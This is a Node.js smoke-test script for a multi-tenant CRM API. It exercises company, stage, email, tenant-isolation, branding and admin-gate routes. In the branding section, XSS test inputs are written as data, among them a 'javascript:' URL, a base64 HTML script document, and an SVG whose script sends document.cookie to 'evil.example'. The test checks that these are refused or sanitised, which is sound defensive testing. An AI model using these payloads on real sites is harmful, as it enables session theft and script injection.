/* End-to-end smoke test against a running API.
 *
 *   node scripts/smoke.mjs          (expects the API on :4000)
 *
 * Exercises every route, including the administrator gate on creating an
 * organization, tenant isolation, the stage remap and the error paths, then
 * deletes everything it created so the demo data is left as it was. Reports a
 * pass/fail table and exits non-zero on any failure.
 *
 * Needs a migrated, seeded database: `npm run migrate && npm run seed`.
 * There are no accounts to sign in as — every route below is reachable, and
 * the only credentials in play are ADMIN_EMAIL / ADMIN_PASSWORD, which gate
 * creating and deleting an organization.
 */

const BASE = process.env.SMOKE_BASE || "http://localhost:4000/api";
const ORG = process.env.SMOKE_ORG || "bsbw";
const ADMIN = {
  adminEmail: process.env.ADMIN_EMAIL || "admin@bsbw.co",
  adminPassword: process.env.ADMIN_PASSWORD || "changeme-please",
};

let pass = 0, fail = 0;
const created = [];

/* `org` overrides the tenant header; false omits it entirely. */
const call = async (method, path, body, { org = ORG } = {}) => {
  const headers = {};
  if (body) headers["Content-Type"] = "application/json";
  if (org) headers["X-Org-Id"] = org;

  const res = await fetch(`${BASE}${path}`, {
    method,
    headers: Object.keys(headers).length ? headers : undefined,
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try { json = text ? JSON.parse(text) : null; } catch { /* not json */ }
  return { status: res.status, json, text };
};

function check(label, cond, detail) {
  if (cond) { pass++; console.log(`  PASS  ${label}`); }
  else { fail++; console.log(`  FAIL  ${label}${detail ? `\n        ${detail}` : ""}`); }
}

const section = (t) => console.log(`\n${t}`);

/* ---- reaching a tenant ----
   The X-Org-Id header still decides which tenant's rows a request touches. It
   no longer proves anything about who is asking; what it must still do is name
   an organization that exists. */
section("reaching a tenant");

const open = await call("GET", "/orgs", undefined, { org: false });
check("the organization list needs no credentials", open.status === 200, `got ${open.status}`);
check("and lists what's on the installation",
  Array.isArray(open.json?.orgs) && open.json.orgs.some(o => o.id === ORG),
  (open.json?.orgs || []).map(o => o.id).join(", "));

const noOrg = await call("GET", "/bootstrap", undefined, { org: false });
check("a request with no org header is 400, not 500", noOrg.status === 400, `got ${noOrg.status}`);

const ghostOrg = await call("GET", "/bootstrap", undefined, { org: "no-such-org" });
check("an organization that doesn't exist is 404", ghostOrg.status === 404, `got ${ghostOrg.status}`);

/* ---- read ---- */
section("bootstrap");
const boot = await call("GET", "/bootstrap");
check("200", boot.status === 200, boot.text?.slice(0, 200));
/* Not a fixed number: this suite has to pass against a demo database and
   against a real one someone has been working in. What matters is that the
   rows are there to begin with and that the same rows are there at the end,
   which is asserted in cleanup. */
const startCount = boot.json?.companies?.length ?? 0;
check("companies present to work with", startCount > 0, `got ${startCount}`);
check("4 default stages", boot.json?.stages?.length === 4, `got ${boot.json?.stages?.length}`);
check("the organization comes back with it", boot.json?.org?.id === ORG, JSON.stringify(boot.json?.org));
check("branding present", /^#[0-9a-f]{6}$/i.test(boot.json?.org?.accent || ""), boot.json?.org?.accent);
/* Ink is no longer stored: it is derived from the accent on the client, so a
   column carrying a second, staleable copy would be the bug. */
check("no stored ink alongside the accent", boot.json?.org?.ink === undefined);
check("the organization's verticals come back",
  Array.isArray(boot.json?.org?.verticals) && boot.json.org.verticals.length > 0,
  JSON.stringify(boot.json?.org?.verticals));
check("and the full list to choose from",
  Array.isArray(boot.json?.allVerticals) && boot.json.allVerticals.length >= boot.json.org.verticals.length);
check("sender present", !!boot.json?.sender?.name);
check("mail status included in bootstrap", boot.json?.mail !== undefined);
check("poll interval reported", typeof boot.json?.mail?.pollSeconds === "number");

/* What these assertions are really for is the json_agg assembly in db.js —
   that a company arrives with its contacts, emails and history nested and
   camelCased. Written against whatever rows happen to be there rather than
   against a named seed company with an exact count, because this suite has to
   pass against a database people have actually been working in: dragging a
   card between stages adds history, opening a company clears its unread. */
const rows = boot.json.companies || [];
const withContact = rows.find(c => c.contacts?.length);
const withEmail = rows.find(c => c.emails?.length);
const withHistory = rows.find(c => c.history?.length);

check("nested contacts assembled",
  !!withContact && typeof withContact.contacts[0].email === "string" &&
  "role" in withContact.contacts[0], JSON.stringify(withContact?.contacts?.[0]));
check("nested emails assembled",
  !!withEmail && ["in", "out"].includes(withEmail.emails[0].dir),
  JSON.stringify(withEmail?.emails?.[0]));
check("nested history assembled",
  !!withHistory && !!withHistory.history[0].d && !!withHistory.history[0].t,
  JSON.stringify(withHistory?.history?.[0]));
check("date is a plain YYYY-MM-DD string",
  typeof rows[0]?.stageSince === "string" && /^\d{4}-\d{2}-\d{2}$/.test(rows[0].stageSince),
  `got ${JSON.stringify(rows[0]?.stageSince)}`);

/* .to on outbound and .from on inbound — the CASE in COMPANY_SELECT that lets
   the UI read one field per direction. Both halves are exercised further down
   on rows this suite creates itself, so a database with only outbound mail in
   it still proves the half it can. */
const anyOut = rows.flatMap(c => c.emails || []).find(m => m.dir === "out");
const anyIn = rows.flatMap(c => c.emails || []).find(m => m.dir === "in");
check("outbound email carries .to and not .from",
  !anyOut || (!!anyOut.to && !anyOut.from), JSON.stringify(anyOut));
check("inbound email carries .from and not .to",
  !anyIn || (!!anyIn.from && !anyIn.to), JSON.stringify(anyIn));
check("read flag round-trips as a boolean",
  rows.flatMap(c => c.emails || []).every(m => typeof m.read === "boolean"));

/* ---- create ---- */
section("create / edit");
const mk = await call("POST", "/companies", {
  name: "Smoke Test Co", vertical: "pest", website: "https://www.smoketest.com/",
  notes: "created by smoke.mjs",
  contacts: [{ name: "Test Person", role: "Head of Nothing", email: "TEST@smoketest.com", phone: "(555) 555-0100" }],
});
check("201", mk.status === 201, mk.text?.slice(0, 200));
const co = mk.json?.companies?.[0];
if (co) created.push(co.id);
check("starts in first stage", co?.stage === "outreach", `got ${co?.stage}`);
check("website normalised", co?.website === "smoketest.com", `got ${co?.website}`);
check("email lowercased", co?.contacts?.[0]?.email === "test@smoketest.com", `got ${co?.contacts?.[0]?.email}`);
check("history seeded", co?.history?.[0]?.t === "Entered outreach");

const patched = await call("PATCH", `/companies/${co.id}`, {
  notes: "edited", contacts: [{ name: "Renamed Person", role: "VP", email: "vp@smoketest.com", phone: "" }],
});
check("PATCH 200", patched.status === 200);
check("notes updated", patched.json?.companies?.[0]?.notes === "edited");
check("contacts replaced", patched.json?.companies?.[0]?.contacts?.length === 1 &&
  patched.json.companies[0].contacts[0].name === "Renamed Person");

/* ---- funnel movement ---- */
section("funnel");
const adv = await call("POST", "/companies/advance", { ids: [co.id] });
check("advance 200", adv.status === 200, adv.text?.slice(0, 200));
check("moved to fu1", adv.json?.companies?.[0]?.stage === "fu1", `got ${adv.json?.companies?.[0]?.stage}`);
check("advance logged history", adv.json?.companies?.[0]?.history?.some(h => h.t === "Follow-up 1 sent"));

const mv = await call("POST", `/companies/${co.id}/move`, { stage: "fu3" });
check("move 200", mv.status === 200);
check("landed on fu3", mv.json?.companies?.[0]?.stage === "fu3");
check("move returns label", mv.json?.stageLabel === "Follow-up 3", `got ${mv.json?.stageLabel}`);
check("move logged history", mv.json?.companies?.[0]?.history?.some(h => h.t === "Moved to Follow-up 3"));

const badMove = await call("POST", `/companies/${co.id}/move`, { stage: "no-such-stage" });
check("move to unknown stage rejected", badMove.status === 400, `got ${badMove.status}`);

/* ---- outbound recording (the Gmail hand-off) ---- */
section("record a Gmail send");
const rec = await call("POST", "/emails/record", {
  ids: [co.id], subject: "Leads for {{company}}",
  body: "Hi {{first_name}},\n\n{{vertical}} leads.\n\n{{sender}}", advance: false,
});
check("record 200", rec.status === 200, rec.text?.slice(0, 300));
const recCo = rec.json?.companies?.[0];
const sent = recCo?.emails?.find(m => m.dir === "out");
check("outbound message stored", !!sent);
check("{{company}} merged", sent?.subject === "Leads for Smoke Test Co", `got ${sent?.subject}`);
check("{{first_name}} merged", sent?.body?.startsWith("Hi Renamed,"), `got ${sent?.body?.slice(0, 20)}`);
check("{{vertical}} merged to label", sent?.body?.includes("Pest Control leads."));
check("{{sender}} merged to this organization's signature",
  !!boot.json?.sender?.name && sent?.body?.includes(boot.json.sender.name),
  `expected "${boot.json?.sender?.name}" in ${JSON.stringify(sent?.body?.slice(-40))}`);
check("stage unchanged when advance=false", recCo?.stage === "fu3", `got ${recCo?.stage}`);
check("history says via Gmail", recCo?.history?.some(h => h.t.startsWith("Emailed via Gmail:")));

const rec2 = await call("POST", "/emails/record", {
  ids: [co.id], subject: "Second touch", body: "Body here.", advance: true,
});
check("record with advance=true 200", rec2.status === 200);
check("advance is a no-op on the last stage", rec2.json?.companies?.[0]?.stage === "fu3",
  `got ${rec2.json?.companies?.[0]?.stage}`);

const noSubject = await call("POST", "/emails/record", { ids: [co.id], subject: "", body: "x" });
check("empty subject rejected", noSubject.status === 400);

const blank = await call("POST", "/companies", { name: "   " });
check("blank company name rejected", blank.status === 400);
if (blank.json?.companies?.[0]) created.push(blank.json.companies[0].id);

/* ---- a company with no contact can't be written to ---- */
const noContact = await call("POST", "/companies", { name: "No Contact Co", contacts: [] });
if (noContact.json?.companies?.[0]) created.push(noContact.json.companies[0].id);
const cantSend = await call("POST", "/emails/record", {
  ids: [noContact.json.companies[0].id], subject: "hi", body: "there",
});
check("no-address company reported, not recorded", cantSend.status === 400 &&
  cantSend.json?.skipped?.[0]?.why === "no email address on file",
  cantSend.text?.slice(0, 200));

/* ---- inbound ---- */
section("inbound");
const logged = await call("POST", "/emails/log", {
  id: co.id, subject: "Re: Leads", body: "Sounds good, send the rate card.",
});
check("log reply 200", logged.status === 200, logged.text?.slice(0, 200));
const logCo = logged.json?.companies?.[0];
check("moved to responded", logCo?.stage === "responded", `got ${logCo?.stage}`);
check("respondedOn stamped", !!logCo?.respondedOn);
check("inbound message on thread", logCo?.emails?.some(m => m.dir === "in" && m.from === "vp@smoketest.com"));
check("history records the move", logCo?.history?.some(h => h.t === "Replied — moved to Responded"));

const hook = await call("POST", "/emails/inbound", {
  from: "vp@smoketest.com", subject: "Webhook reply", text: "via the webhook",
});
check("webhook 200", hook.status === 200);
check("webhook filed it", hook.json?.filed === true && hook.json?.companyId === co.id, hook.text);

/* A reply nobody has looked at yet arrives unread, which is what puts the dot
   on the row. "Log a reply" is filed read — you typed it in, so you've read it
   — and this one came from the webhook, so it must not be. */
const afterHook = await call("GET", "/companies");
const hookCo = afterHook.json?.companies?.find(c => c.id === co.id);
check("a webhook reply arrives unread",
  hookCo?.emails?.some(m => m.dir === "in" && m.read === false),
  JSON.stringify(hookCo?.emails?.map(m => ({ dir: m.dir, read: m.read }))));

const unknown = await call("POST", "/emails/inbound", {
  from: "nobody@nowhere.example", subject: "x", text: "y",
});
check("unknown sender left alone, still 200", unknown.status === 200 && unknown.json?.filed === false);

/* a second reply must NOT drag a responded company backwards */
const already = await call("POST", "/emails/log", { id: co.id, subject: "again", body: "again" });
check("second reply keeps stage at responded",
  already.json?.companies?.[0]?.stage === "responded",
  `got ${already.json?.companies?.[0]?.stage}`);

const read = await call("POST", `/companies/${co.id}/read`);
check("mark read 200", read.status === 200);
check("no unread inbound left",
  !read.json?.companies?.[0]?.emails?.some(m => m.dir === "in" && !m.read));

/* ---- lifecycle stamps ---- */
section("lifecycle");
const meet = await call("POST", "/companies/stamp", { ids: [co.id], to: "meeting" });
check("stamp meeting", meet.status === 200 && meet.json?.companies?.[0]?.stage === "meeting");
check("meetingOn stamped", !!meet.json?.companies?.[0]?.meetingOn);
const closed = await call("POST", "/companies/stamp", { ids: [co.id], to: "closed" });
check("stamp closed", closed.status === 200 && closed.json?.companies?.[0]?.stage === "closed");
check("closedOn stamped", !!closed.json?.companies?.[0]?.closedOn);
const badStamp = await call("POST", "/companies/stamp", { ids: [co.id], to: "banana" });
check("unknown stamp rejected", badStamp.status === 400);

/* ---- import ---- */
section("import");
const imp = await call("POST", "/companies/import", {
  records: [
    { name: "Imported One", vertical: "mva", website: "impone.com", stage: "fu2",
      contacts: [{ name: "Ann Imp", email: "ann@impone.com", role: "Partner", phone: "" }],
      notes: "", history: [{ t: "Imported from spreadsheet" }] },
    { name: "Imported Two", vertical: "aca", website: "imptwo.com", stage: "responded",
      contacts: [], notes: "", history: [{ t: "Imported from spreadsheet" }] },
    { name: "Imported Three", vertical: "pest", website: "", stage: "not-a-real-stage",
      contacts: [], notes: "", history: [] },
  ],
});
check("import 201", imp.status === 201, imp.text?.slice(0, 200));
check("3 imported", imp.json?.count === 3, `got ${imp.json?.count}`);
imp.json?.companies?.forEach(c => created.push(c.id));
check("stage honoured", imp.json?.companies?.find(c => c.name === "Imported One")?.stage === "fu2");
check("terminal stage honoured", imp.json?.companies?.find(c => c.name === "Imported Two")?.stage === "responded");
check("bad stage falls back to first",
  imp.json?.companies?.find(c => c.name === "Imported Three")?.stage === "outreach");
check("import history written",
  imp.json?.companies?.[0]?.history?.[0]?.t === "Imported from spreadsheet");

const emptyImport = await call("POST", "/companies/import", { records: [] });
check("empty import rejected", emptyImport.status === 400);

/* ---- stages: add, rename, then delete with remap ---- */
section("stages");
const base = boot.json.stages;
const withExtra = await call("PUT", "/stages", {
  stages: [...base, { id: "smoke_tmp", label: "Smoke Stage", sub: "temp", accent: "#E0709A", wait: 3 }],
  remap: {},
});
check("add stage 200", withExtra.status === 200, withExtra.text?.slice(0, 200));
check("5 stages now", withExtra.json?.stages?.length === 5, `got ${withExtra.json?.stages?.length}`);
check("new stage last", withExtra.json?.stages?.[4]?.id === "smoke_tmp");
check("wait persisted", withExtra.json?.stages?.[4]?.wait === 3);

/* park a company on the temp stage, then delete the stage and remap it away */
const parked = await call("POST", `/companies/${created[0]}/move`, { stage: "smoke_tmp" });
check("company parked on temp stage", parked.json?.companies?.[0]?.stage === "smoke_tmp",
  `got ${parked.json?.companies?.[0]?.stage}`);

const removed = await call("PUT", "/stages", { stages: base, remap: { smoke_tmp: "fu1" } });
check("delete stage 200", removed.status === 200, removed.text?.slice(0, 200));
check("back to 4 stages", removed.json?.stages?.length === 4);
const moved = removed.json?.companies?.find(c => c.id === created[0]);
check("parked company remapped to fu1", moved?.stage === "fu1", `got ${moved?.stage}`);
check("remap logged in history",
  moved?.history?.some(h => h.t === "Stage removed — moved to Follow-up 1"));

const emptyStages = await call("PUT", "/stages", { stages: [], remap: {} });
check("empty pipeline rejected", emptyStages.status === 400);
const unnamed = await call("PUT", "/stages", { stages: [{ id: "x", label: "  " }], remap: {} });
check("unnamed stage rejected", unnamed.status === 400);
const badRemap = await call("PUT", "/stages", {
  stages: base, remap: { fu1: "also_being_deleted" },
});
check("remap into a deleted stage rejected", badRemap.status === 400);

/* ---- reply syncing ----
   These assertions hold whether or not a mailbox is configured, so the suite
   stays green both before and after you put IMAP credentials in .env. */
section("reply syncing");
const ms = await call("GET", "/mail/status");
check("status 200", ms.status === 200);
check("reports whether IMAP is configured",
  typeof ms.json?.configured === "boolean", JSON.stringify(ms.json));
check("reports the poll interval", typeof ms.json?.pollSeconds === "number");

const configured = ms.json?.configured === true;
const msync = await call("POST", "/mail/sync");
if (configured) {
  check("sync runs against the live mailbox",
    msync.status === 200 && typeof msync.json?.filed === "number",
    msync.text?.slice(0, 300));
  const mtest = await call("POST", "/mail/test");
  check("connection test answers with a verdict",
    mtest.status === 200 && typeof mtest.json?.ok === "boolean", mtest.text?.slice(0, 200));
} else {
  check("sync without credentials is refused clearly, not silently",
    msync.status === 409 && /IMAP isn't configured/.test(msync.json?.error || ""),
    msync.text?.slice(0, 200));
  const mtest = await call("POST", "/mail/test");
  check("test without credentials says so", mtest.status === 409);
}

/* ---- tenant isolation ----
   The assertions the whole multi-tenant design rests on. Company ids are a
   single sequence across every organization, so guessing one belonging to a
   tenant you can't see is trivial — which is why every statement filters on
   org_id and not merely on the id it was handed.

   This is now the only thing keeping two tenants apart — there are no accounts
   and no membership check above it — so it matters more, not less. */
section("tenant isolation");

const otherOrg = (open.json.orgs || []).find(o => o.id !== ORG)?.id;
if (!otherOrg) {
  console.log("  SKIP  only one organization on this installation - run `npm run migrate`");
} else {
  const theirs = await call("GET", "/companies", undefined, { org: otherOrg });
  check(`${otherOrg} has its own companies`, theirs.status === 200 && theirs.json?.companies?.length > 0,
    `got ${theirs.status} / ${theirs.json?.companies?.length}`);

  const mine = new Set((boot.json.companies || []).map(c => c.id));
  check("and shares none of them with " + ORG,
    (theirs.json?.companies || []).every(c => !mine.has(c.id)));

  const victim = theirs.json?.companies?.[0];

  /* Each of these names a real id, so anything other than a refusal means the
     org filter is missing from that statement. */
  const peek = await call("PATCH", `/companies/${victim.id}`, { notes: "hijacked" });
  check("can't PATCH a company in another organization", peek.status === 404, `got ${peek.status}`);

  const shove = await call("POST", `/companies/${victim.id}/move`, { stage: "fu1" });
  check("can't move one", shove.status === 400, `got ${shove.status}`);

  const brand = await call("POST", "/companies/stamp", { ids: [victim.id], to: "closed" });
  check("can't stamp one", brand.status === 404, `got ${brand.status}`);

  const wipe = await call("POST", "/companies/delete", { ids: [victim.id] });
  check("delete reports nothing removed rather than removing it",
    wipe.status === 200 && wipe.json?.deleted === 0, JSON.stringify(wipe.json));

  const write = await call("POST", "/emails/record",
    { ids: [victim.id], subject: "hi", body: "there" });
  check("can't record a send against one", write.status === 404, `got ${write.status}`);

  const still = await call("GET", "/companies", undefined, { org: otherOrg });
  const after = still.json?.companies?.find(c => c.id === victim.id);
  check("and it survived all of that untouched",
    !!after && after.notes !== "hijacked" && after.stage === victim.stage,
    JSON.stringify({ notes: after?.notes, stage: after?.stage }));

  /* Stages are keyed on (org_id, id), so both tenants having an 'outreach' is
     the expected case, not a collision. */
  const theirStages = await call("GET", "/stages", undefined, { org: otherOrg });
  check("each organization has its own pipeline rows",
    theirStages.json?.stages?.length === 4, `got ${theirStages.json?.stages?.length}`);
}

/* ---- organization branding ----
   A logo is a URL that ends up in an <img src> on every member's landing page,
   so what it is allowed to be matters. These assertions are non-destructive:
   they PATCH the caller's own organization with values that must be refused,
   then confirm nothing changed. */
section("organization branding");

const before = boot.json.org;
const badLogos = [
  ["javascript:", "javascript:alert(1)"],
  ["a data: document", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
  ["plain http", "http://example.com/logo.png"],
  ["a protocol-relative URL", "//evil.example/logo.png"],
  ["a data: URI that isn't an image", "data:application/json;base64,e30="],
];
for (const [what, value] of badLogos) {
  const r = await call("PATCH", `/orgs/${ORG}`, { logo: value });
  check(`logo rejects ${what}`, r.status === 400, `got ${r.status} ${r.text?.slice(0, 90)}`);
}

/* Logos are uploaded now, so they arrive as data: URIs. SVG is allowed —
   an <img> renders it in the browser's secure static mode — but the dangerous
   parts are stripped before storage rather than trusted to that. */
const png1x1 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
const upPng = await call("PATCH", `/orgs/${ORG}`, { logo: png1x1 });
check("an uploaded PNG is accepted", upPng.status === 200, upPng.text?.slice(0, 120));

const dirtySvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">`
  + `<script>fetch('//evil.example?c='+document.cookie)</script>`
  + `<image href="https://evil.example/pixel.png" onload="alert(1)"/>`
  + `<circle cx="5" cy="5" r="4" fill="#0AB"/></svg>`;
const upSvg = await call("PATCH", `/orgs/${ORG}`,
  { logo: `data:image/svg+xml;base64,${Buffer.from(dirtySvg).toString("base64")}` });
check("an uploaded SVG is accepted", upSvg.status === 200, upSvg.text?.slice(0, 120));

const storedSvg = upSvg.json?.orgs?.find(o => o.id === ORG)?.logo || "";
const decoded = storedSvg.startsWith("data:image/svg+xml;base64,")
  ? Buffer.from(storedSvg.slice("data:image/svg+xml;base64,".length), "base64").toString("utf8")
  : "";
check("the script element is stripped before storage", !/<script/i.test(decoded), decoded.slice(0, 140));
check("event handlers are stripped", !/onload/i.test(decoded), decoded.slice(0, 140));
check("off-origin references are stripped", !/evil\.example/i.test(decoded), decoded.slice(0, 140));
check("and the actual artwork survives", /<circle/i.test(decoded), decoded.slice(0, 140));

const huge = await call("PATCH", `/orgs/${ORG}`,
  { logo: `data:image/png;base64,${"A".repeat(600 * 1024)}` });
check("an oversized logo is refused", huge.status === 400, `got ${huge.status}`);

const goodLogo = await call("PATCH", `/orgs/${ORG}`, { logo: "/brand/smoke-test.svg" });
check("logo accepts a path on this site", goodLogo.status === 200, goodLogo.text?.slice(0, 120));
check("and it comes back on the org",
  goodLogo.json?.orgs?.find(o => o.id === ORG)?.logo === "/brand/smoke-test.svg");

const httpsLogo = await call("PATCH", `/orgs/${ORG}`, { logo: "https://example.com/logo.png" });
check("logo accepts https", httpsLogo.status === 200, httpsLogo.text?.slice(0, 120));

/* Put it back exactly as it was, so a suite run leaves no trace on branding. */
const restored = await call("PATCH", `/orgs/${ORG}`, { logo: before?.logo ?? "" });
check("branding restored to what it was",
  restored.json?.orgs?.find(o => o.id === ORG)?.logo === (before?.logo ?? ""),
  `expected ${JSON.stringify(before?.logo)}`);

/* ---- colour ----
   Any colour is allowed now, so what the API guarantees is narrower: that what
   comes back out is a colour. The contrast work happens on the client, where
   a 1440-colour sweep covers it. */
const odd = await call("PATCH", `/orgs/${ORG}`, { accent: "#ff00aa" });
check("any colour is accepted", odd.status === 200, odd.text?.slice(0, 120));
check("and normalised to uppercase",
  odd.json?.orgs?.find(o => o.id === ORG)?.accent === "#FF00AA",
  odd.json?.orgs?.find(o => o.id === ORG)?.accent);

for (const [what, value] of [["a colour name", "rebeccapurple"], ["a short hex", "#f0a"],
  ["nonsense", "not-a-colour"]]) {
  const r = await call("PATCH", `/orgs/${ORG}`, { accent: value });
  const got = r.json?.orgs?.find(o => o.id === ORG)?.accent;
  check(`${what} falls back rather than storing junk`,
    r.status === 200 && /^#[0-9A-F]{6}$/.test(got || ""), `got ${got}`);
}

await call("PATCH", `/orgs/${ORG}`, { accent: before.accent });

/* ---- verticals ---- */
const vlist = await call("GET", "/orgs/verticals", undefined, { org: false });
check("the vertical list is served", vlist.status === 200 && vlist.json?.verticals?.length > 0);

const emptyV = await call("PATCH", `/orgs/${ORG}`, { verticals: [] });
check("an organization must work in at least one vertical", emptyV.status === 400, `got ${emptyV.status}`);

const badV = await call("PATCH", `/orgs/${ORG}`, { verticals: ["mva", "not-a-vertical"] });
check("an unknown vertical is refused", badV.status === 400, `got ${badV.status}`);

const someV = await call("PATCH", `/orgs/${ORG}`, { verticals: ["home_svc", "mva"] });
check("a subset is accepted", someV.status === 200, someV.text?.slice(0, 120));
check("and stored in the canonical order, not the order sent",
  JSON.stringify(someV.json?.orgs?.find(o => o.id === ORG)?.verticals) === JSON.stringify(["mva", "home_svc"]),
  JSON.stringify(someV.json?.orgs?.find(o => o.id === ORG)?.verticals));

await call("PATCH", `/orgs/${ORG}`, { verticals: before.verticals });

/* ---- the administrator gate ----
   Creating an organization is the one action that changes what the whole
   installation contains, so it is the one action that asks for credentials.
   Everything else above needed none. */
section("the administrator gate");

const newOrg = {
  id: `smoke-org-${Date.now().toString(36)}`,
  name: "Smoke Org",
  verticals: ["mva"],
};

const noCreds = await call("POST", "/orgs", newOrg, { org: false });
check("creating without credentials is refused", noCreds.status === 401, `got ${noCreds.status}`);

const wrongPw = await call("POST", "/orgs",
  { ...newOrg, adminEmail: ADMIN.adminEmail, adminPassword: "definitely-not-it" }, { org: false });
check("the wrong password is refused", wrongPw.status === 401, `got ${wrongPw.status}`);

const wrongEmail = await call("POST", "/orgs",
  { ...newOrg, adminEmail: "someone@else.test", adminPassword: ADMIN.adminPassword }, { org: false });
check("the wrong email is refused", wrongEmail.status === 401, `got ${wrongEmail.status}`);
check("and neither says which half was wrong",
  wrongPw.json?.error === wrongEmail.json?.error, wrongPw.json?.error);

const orgsBefore = (await call("GET", "/orgs", undefined, { org: false })).json.orgs.length;
const refusedCount = (await call("GET", "/orgs", undefined, { org: false })).json.orgs.length;
check("nothing was created by the refused attempts", refusedCount === orgsBefore,
  `${orgsBefore} -> ${refusedCount}`);

const made = await call("POST", "/orgs", { ...newOrg, ...ADMIN }, { org: false });
check("the right credentials create it", made.status === 201, made.text?.slice(0, 160));
check("it comes back with the list",
  made.json?.orgs?.some(o => o.id === newOrg.id), (made.json?.orgs || []).map(o => o.id).join(", "));

const madeStages = await call("GET", "/stages", undefined, { org: newOrg.id });
check("and starts with the four default stages",
  madeStages.json?.stages?.length === 4, `got ${madeStages.json?.stages?.length}`);

/* Deleting is gated the same way, and additionally asks for the name back. */
const wrongName = await call("POST", `/orgs/${newOrg.id}/delete`,
  { confirm: "not the name", ...ADMIN }, { org: newOrg.id });
check("deleting needs the name typed back", wrongName.status === 400, `got ${wrongName.status}`);

const unauthorisedDelete = await call("POST", `/orgs/${newOrg.id}/delete`,
  { confirm: newOrg.name }, { org: newOrg.id });
check("and credentials", unauthorisedDelete.status === 401, `got ${unauthorisedDelete.status}`);

const gone = await call("POST", `/orgs/${newOrg.id}/delete`,
  { confirm: newOrg.name, ...ADMIN }, { org: newOrg.id });
check("both together remove it", gone.status === 200, gone.text?.slice(0, 160));
check("and it's off the list", !gone.json?.orgs?.some(o => o.id === newOrg.id));

const orgsAfter = (await call("GET", "/orgs", undefined, { org: false })).json.orgs.length;
check("the installation is back to the organizations it had",
  orgsAfter === orgsBefore, `${orgsBefore} -> ${orgsAfter}`);

/* ---- 404s ---- */
section("misc");
const nope = await call("GET", "/does-not-exist");
check("unknown endpoint 404s as JSON", nope.status === 404 && !!nope.json?.error);
const ghost = await call("PATCH", "/companies/99999999", { notes: "x" });
check("patching a missing company 404s", ghost.status === 404, `got ${ghost.status}`);

/* ---- cleanup: cascade must take contacts, emails and history with it ---- */
section("cleanup");
const del = await call("POST", "/companies/delete", { ids: created });
check("delete 200", del.status === 200, del.text?.slice(0, 200));
check(`deleted all ${created.length} test rows`, del.json?.deleted === created.length,
  `deleted ${del.json?.deleted} of ${created.length}`);

const after = await call("GET", "/bootstrap");
check("existing data untouched", after.json?.companies?.length === startCount,
  `started with ${startCount}, ended with ${after.json?.companies?.length}`);
check("stages back to 4", after.json?.stages?.length === 4);

console.log(`\n${"=".repeat(46)}\n  ${pass} passed, ${fail} failed\n${"=".repeat(46)}`);
process.exit(fail ? 1 : 0);
